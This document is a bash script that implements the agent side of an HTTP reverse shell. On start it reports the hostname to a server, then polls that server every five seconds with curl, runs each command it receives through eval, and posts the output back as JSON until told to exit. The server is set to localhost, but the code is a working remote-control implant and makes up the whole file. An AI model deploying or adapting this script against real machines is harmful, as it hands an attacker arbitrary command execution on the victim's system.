#!/bin/bash      

#THIS IS A SIMPLE BASH IMPLEMENTATION OF THE HTTP REVERSE SHELL Agent


function getFromServer () {

	ip=$(curl -s $server)

	# save curl results to file we can use later 
	echo $ip > tmp.txt


}


function postToServer () {

	command=$(jq -r '.command' tmp.txt)
	eval $command |& tee return.txt 

	rawdata=$(cat return.txt)
	data=$(jq -n "{data:\"$rawdata\"}")
	echo $data > data.json
	curl -d "@data.json" -H "Content-Type: application/json" -X POST $server
}





# i will never change value but it gives a way for the while loop to run until the exit condition
i="0"

server="127.0.0.1:8080"



#Start process with post request before while loop 
#initiates return.txt with a default value. 
touch return.txt
host=$(hostname)
echo "[+] Connected to $host" > return.txt
rawdata=$(cat return.txt)
data=$(jq -n "{data:\"$rawdata\"}")
echo $data > data.json
curl -d "@data.json" -H "Content-Type: application/json" -X POST $server

while [ $i -eq 0 ]
do
	
	getFromServer

	# if no input from server continue loop
	if [[ $ip == "false" ]]; then
		echo " "
	else 
		postToServer

		if [[ $command == "exit" ]]; then
			break
		fi
	fi

	sleep 5
done


